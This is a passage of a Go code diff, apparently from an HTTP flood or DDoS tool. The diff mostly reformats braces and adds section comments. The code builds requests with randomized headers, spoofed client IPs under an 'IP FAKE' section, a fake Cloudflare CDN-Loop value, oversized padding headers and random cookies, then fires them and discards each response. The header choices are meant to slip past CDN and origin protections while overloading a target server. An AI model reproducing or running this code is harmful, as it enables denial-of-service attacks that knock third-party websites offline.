-req.Header.Set("TE", "trailers")
-}
+req.Header.Set("TE", "trailers")}
 if rng.Intn(4) == 0 {
-req.Header.Set("A-IM", "Feed")
-}
+req.Header.Set("A-IM", "Feed")}
 if rng.Intn(4) == 0 {
-req.Header.Set("Delta-Base", "12340001")
-}
+req.Header.Set("Delta-Base", "12340001")}
 if rng.Intn(3) == 0 {
-req.Header.Set("dnt", "1")
-}
+req.Header.Set("dnt", "1")}
 if rng.Intn(4) == 0 {
-req.Header.Set("Access-Control-Request-Method", "GET")
-}
+req.Header.Set("Access-Control-Request-Method", "GET")}
 if rng.Intn(5) == 0 {
-req.Header.Set("source-ip", RST(rng, 5))
-}
+req.Header.Set("source-ip", RST(rng, 5))}
 if rng.Intn(4) == 0 {
-req.Header.Set("Data-Return", "false")
-}
+req.Header.Set("Data-Return", "false")}
 if Supported["X-Original-URL"] && rng.Intn(3) == 0 {
-req.Header.Set("X-Original-URL", "/"+strconv.FormatInt(rng.Int63(), 16))
-}
+req.Header.Set("X-Original-URL", "/"+strconv.FormatInt(rng.Int63(), 16))}
 if Supported["X-Forwarded-Host"] && rng.Intn(3) == 0 {
-req.Header.Set("X-Forwarded-Host", strconv.FormatInt(rng.Int63(), 16)+"t.me/ytdizflyze")
-}
+req.Header.Set("X-Forwarded-Host", strconv.FormatInt(rng.Int63(), 16)+"t.me/ytdizflyze")}
 if Supported["X-Request-ID"] && rng.Intn(3) == 0 {
-req.Header.Set("X-Request-ID", strconv.FormatInt(rng.Int63(), 16))
-}
+req.Header.Set("X-Request-ID", strconv.FormatInt(rng.Int63(), 16))}
 if Supported["CF-Connecting-IP"] && rng.Intn(5) == 0 {
-req.Header.Set("CF-Connecting-IP", cli.ip)
-}
+req.Header.Set("CF-Connecting-IP", cli.ip)}
 if Supported["True-Client-IP"] && rng.Intn(5) == 0 {
-req.Header.Set("True-Client-IP", cli.ip)
-}
+req.Header.Set("True-Client-IP", cli.ip)}
 if Supported["CDN-Loop"] && rng.Intn(5) == 0 {
-req.Header.Set("CDN-Loop", "cloudflare")
-}
+req.Header.Set("CDN-Loop", "cloudflare")}
 if rng.Intn(5) == 0 {
-req.Header.Set("X-Real-IP", cli.ip)
-}
+req.Header.Set("X-Real-IP", cli.ip)}
 if MaxHead > 0 && rng.Intn(2) == 0 {
 size := MaxHead/2 + rng.Intn(MaxHead/2)
 if size < 1 {
 size = 512
 }
-req.Header.Set("X-Large-Data", strings.Repeat("x", size))
-}
+req.Header.Set("X-Large-Data", strings.Repeat("x", size))}
+
+// ================== COOKIE ==================
 var cookies []string
 if CCK != "" {
-cookies = append(cookies, CCK)
-}
+cookies = append(cookies, CCK)}
 for _, name := range COOKIES {
 if rng.Intn(2) == 0 {
-cookies = append(cookies, name+"="+strconv.FormatInt(rng.Int63(), 16))
-}
-}
+cookies = append(cookies, name+"="+strconv.FormatInt(rng.Int63(), 16))}}
 if len(cookies) > 0 {
-req.Header.Set("Cookie", strings.Join(cookies, "; "))
-}
+req.Header.Set("Cookie", strings.Join(cookies, "; "))}
+
+// ================== IP FAKE ==================
 pid := cli.ip
 if pid == "" {
 pid = FORIP
 }
 req.Header.Set("X-Forwarded-For", pid)
 req.Header.Set("X-Real-IP", pid)
+
+// ================== EKSEKUSI ==================
 resp, err := cli.client.Do(req)
 if err == nil {
 io.Copy(io.Discard, resp.Body)
-resp.Body.Close()
-}
-}
-}(c, i)
-}
+resp.Body.Close()}}}(c, i)}
 
 // ================== CTRL/TIME ==================
 sig := make(chan os.Signal, 1)
@@ -1005,8 +972,6 @@ signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
 select {
 case <-sig:
 cancel()
-case <-ctx.Done():
-}
+case <-ctx.Done():}
 wg2.Wait()
-fmt.Println()
-}
+fmt.Println()}
